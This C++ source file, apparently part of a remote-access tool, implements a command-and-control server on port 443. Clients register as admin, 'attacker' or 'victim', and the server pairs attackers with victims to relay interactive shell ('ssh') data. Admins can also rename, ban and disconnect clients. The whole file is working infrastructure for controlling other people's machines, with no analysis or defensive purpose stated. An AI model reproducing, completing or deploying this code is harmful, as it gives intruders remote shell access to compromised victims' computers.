#include "server.hpp"
#include <iostream>
#include <exception>
#include <set>

Server::Server()
{
	if (listener.listen(443) != sf::Socket::Status::Done)
		std::exit(-1);
	selector.add(listener);
	
	try {
		const auto& pub = sf::IpAddress::getPublicAddress();
		const auto& priv = sf::IpAddress::getLocalAddress();
		const auto& port = listener.getLocalPort();
		std::cout << getTime() << " - listening on port " << port << " (" << 
			priv.value().toString() << " / " << pub.value().toString() << ")\n";
	}
	catch (std::exception& e) {
		std::cout << e.what() << "\n";
		std::exit(-2);
	}
}

int Server::processIncoming()
{
	if (!selector.wait()) {
		sf::sleep(sf::milliseconds(1));
		return 0;
	}

	//listen for incoming connections
	if (selector.isReady(listener)) {
		Client c;
		c.socket = new sf::TcpSocket();
		//client accepted successfully
		if (listener.accept(*c.socket) == sf::Socket::Status::Done) {
			auto id = nextId++;
			uninitialized[id] = c;
			selector.add(*c.socket);
		
			std::cout << getTime() << " - new connection (" << id << ") = " <<
				c.socket->getRemoteAddress().value() << ":" << c.socket->getRemotePort() << "\n";
		}
		//failed to accept client 
		else
			delete c.socket;
	}

	//listen for initialization attempts
	std::set<std::uint16_t> initializedIds;
	std::set<std::uint16_t> idsToRemove;
	for (auto& [id, u] : uninitialized) {
		if (!selector.isReady(*u.socket))
			continue;

		sf::Packet p;
		auto status = u.socket->receive(p);
		//forget disconnected client
		if (status == sf::Socket::Status::Disconnected) {
			std::cout << getTime() << " - uninitialized client disconnected (" << id << ")\n";

			selector.remove(*uninitialized[id].socket);
			delete uninitialized[id].socket;

			idsToRemove.insert(id);
			continue;
		}
		else if (status != sf::Socket::Status::Done)
			continue;

		std::uint16_t reqId;
		std::uint8_t cmd;
		p >> reqId >> cmd;

		//accept admin
		if (cmd == std::uint8_t(1)) {
			std::string hId, pw;
			p >> hId >> pw;
			if (database.find(hId) == database.end())
				database[hId] = HIdInfo();

			//password is correct
			if (pw == adminPass) {
				sf::Packet res;
				res << reqId << bool(true) << uint16_t(id);
				auto _ = u.socket->send(res);

				u.isAttacker = true, u.isAdmin = true, u.hId = hId;
				initializedIds.insert(id);
				clients[id] = u;

				idsToRemove.insert(id);

				std::cout << getTime() << " - " << id << " = admin: " << hId << "\n";
				sendClientList();
			}
			//password is not correct
			else {
				sf::Packet res;
				res << reqId << bool(false);
				auto _ = u.socket->send(res);

				selector.remove(*u.socket);
				delete u.socket;

				std::cout << getTime() << " - failed admin login (" << id << ")\n";
				idsToRemove.insert(id);
			}
		}
		//accept attacker
		else if (cmd == std::uint8_t(2)) {
			std::string hId;
			p >> hId;
			if (database.find(hId) == database.end())
				database[hId] = HIdInfo();

			//client is banned (access denied)
			if (database[hId].isBanned) {
				sf::Packet res;
				res << reqId << bool(false);
				auto _ = u.socket->send(res);

				selector.remove(*u.socket);
				delete u.socket;

				std::cout << getTime() << " - banned client (" << id << "): " << hId << "\n";
				idsToRemove.insert(id);
			}
			//access granted
			else {
				sf::Packet res;
				res << reqId << bool(true) << uint16_t(id);
				auto _ = u.socket->send(res);

				u.isAttacker = true, u.hId = hId;
				initializedIds.insert(id);
				idsToRemove.insert(id);

				clients[id] = u;

				std::cout << getTime() << " - " << id << " = attacker: " << hId << "\n";
				sendClientList();
			}
		}
		//accept victim
		else if (cmd == std::uint8_t(3)) {
			std::string hId;
			p >> hId;
			if (database.find(hId) == database.end())
				database[hId] = HIdInfo();

			sf::Packet res;
			res << reqId << bool(true) << uint16_t(id);
			auto _ = u.socket->send(res);

			u.isAttacker = false, u.hId = hId;
			initializedIds.insert(id);
			idsToRemove.insert(id);

			clients[id] = u;

			std::cout << getTime() << " - " << id << " = victim: " << hId << "\n";
			sendClientList();
		}
	}
	for (const auto& id : idsToRemove)
		uninitialized.erase(id);

	//listen for client communication
	std::set<std::string> bannedHIds;
	std::set<uint16_t> idsToDisconnect;
	for (auto& [id, c] : clients) {
		//skip just initialized clients
		if (initializedIds.find(id) != initializedIds.end())
			continue;
		if (!selector.isReady(*c.socket))
			continue;

		sf::Packet p;
		auto status = c.socket->receive(p);
		//forget disconnected client
		if (status == sf::Socket::Status::Disconnected) {
			std::cout << getTime() << " - client disconnected (" << id << ")\n";
			idsToDisconnect.insert(id);
			continue;
		}
		else if (status != sf::Socket::Status::Done)
			continue;

		uint16_t reqId;
		uint8_t cmd;
		p >> reqId >> cmd;

		//stop ssh
		if (cmd == uint8_t(10)) {
			//not paired or invalid pairing
			if (c.sshId == 0 || clients.find(c.sshId) == clients.end())
				continue;

			sf::Packet res;
			res << uint16_t(0) << uint8_t(10);
			auto _ = clients[c.sshId].socket->send(res);

			clients[c.sshId].sshId = 0;
			c.sshId = 0;
			continue;
		}
		//send ssh data
		else if (cmd == uint8_t(11)) {
			if (c.sshId == 0 || clients.find(c.sshId) == clients.end())
				continue;

			std::string data;
			p >> data;

			sf::Packet res;
			res << uint16_t(0) << uint8_t(11) << data;
			auto _ = clients[c.sshId].socket->send(res);
			continue;
		}

		if (!c.isAttacker)
			continue;

		//change client name
		if (cmd == uint8_t(5)) {
			std::string hId, name;
			p >> hId >> name;
			if (c.isAdmin && database.find(hId) != database.end()) {
				database[hId].name = name;
				sendClientList();
			}
		}
		//ban client
		else if (cmd == uint8_t(6)) {
			std::string hId;
			p >> hId;

			if (c.isAdmin && database.find(hId) != database.end()) {
				if (!database[hId].isBanned) {
					database[hId].isBanned = true;
					bannedHIds.insert(hId);
					sendClientList();
				}
			}
		}
		//unban client
		else if (cmd == uint8_t(7)) {
			std::string hId;
			p >> hId;

			if (c.isAdmin && database.find(hId) != database.end()) {
				if (database[hId].isBanned) {
					database[hId].isBanned = false;
					sendClientList();
				}
			}
		}
		//kill client
		else if (cmd == uint8_t(8)) {
			uint16_t id;
			p >> id;

			if (c.isAdmin && clients.find(id) != clients.end() && !clients[id].isAdmin) {
				std::cout << getTime() << " - client killed (" << id << ")\n";
				idsToDisconnect.insert(id);
			}
		}
		//start ssh
		else if (cmd == uint8_t(9)) {
			uint16_t oId;
			p >> oId;
			//1 = success, 2 = already paired, 3 = invalid id
			//4 = other id already paired
			uint8_t code = uint8_t(0);

			//this client is already paired
			if (c.sshId != 0)
				code = uint8_t(2);
			else if (id == oId)
				code = uint8_t(3);
			//check if the client exists
			else if (clients.find(oId) != clients.end()) {
				if (clients[oId].isAttacker)
					code = uint8_t(3);
				//other client is already paired
				else if (clients[oId].sshId != 0)
					code = uint8_t(4);
				else {
					clients[oId].sshId = id;
					c.sshId = oId;
					code = uint8_t(1);
				}				
			}
			else 
				code = uint8_t(3);

			sf::Packet res;
			res << reqId << code;
			auto _ = c.socket->send(res);

			if (code == uint8_t(1)) {
				res.clear();
				res << uint16_t(0) << uint8_t(9);
				_ = clients[oId].socket->send(res);
			}
		}
		else
			std::cout << getTime() << " - unknown command (" << id << "): " << int(cmd) << "\n";
	}

	//add banned clients to the kill list
	for (const auto& hId : bannedHIds) {
		for (auto& [id, c] : clients) {
			//check if client needs to be killed
			if (c.hId == hId && c.isAttacker && !c.isAdmin) {
				std::cout << getTime() << " - attacker banned (" << id << ")\n";
				idsToDisconnect.insert(id);
			}
		}
	}
	//kill all the clients that need to
	for (const auto& id : idsToDisconnect)
		disconnectClient(id);
	if (idsToDisconnect.size() > 0)
		sendClientList();

	return 0;
}

void Server::sendClientList()
{
	sf::Packet admPacket, attPacket;
	admPacket << uint16_t(0) << uint8_t(4) << uint16_t(database.size());
	attPacket << uint16_t(0) << uint8_t(4) << uint16_t(0);

	for (const auto& [hId, info] : database)
		admPacket << hId << info.name << info.isBanned;

	admPacket << uint16_t(clients.size());
	attPacket << uint16_t(clients.size());

	for (const auto& [id, c] : clients) {
		std::string ip = c.socket->getRemoteAddress().value().toString() 
			+ ":" + std::to_string(c.socket->getRemotePort());

		admPacket << c.hId << ip << id << c.isAttacker << c.isAdmin;
		attPacket << c.hId << ip << id << c.isAttacker << c.isAdmin;
	}

	for (const auto& [id, c] : clients) {
		if (c.isAdmin)
			auto _ = c.socket->send(admPacket);
		else if (c.isAttacker)
			auto _ = c.socket->send(attPacket);
	}
}

void Server::disconnectClient(uint16_t id)
{
	if (clients.find(id) == clients.end()) {
		std::cout << getTime() << " - disconnectClient: client not found (" << id << ")\n";
		return;
	}

	//notify paired client about the disconnection
	if (clients[id].sshId != 0 && clients.find(clients[id].sshId) != clients.end()) {
		sf::Packet res;
		res << uint16_t(0) << uint8_t(10);
		auto _ = clients[clients[id].sshId].socket->send(res);
		clients[clients[id].sshId].sshId = 0;
	}

	selector.remove(*clients[id].socket);
	delete clients[id].socket;

	clients.erase(id);
}
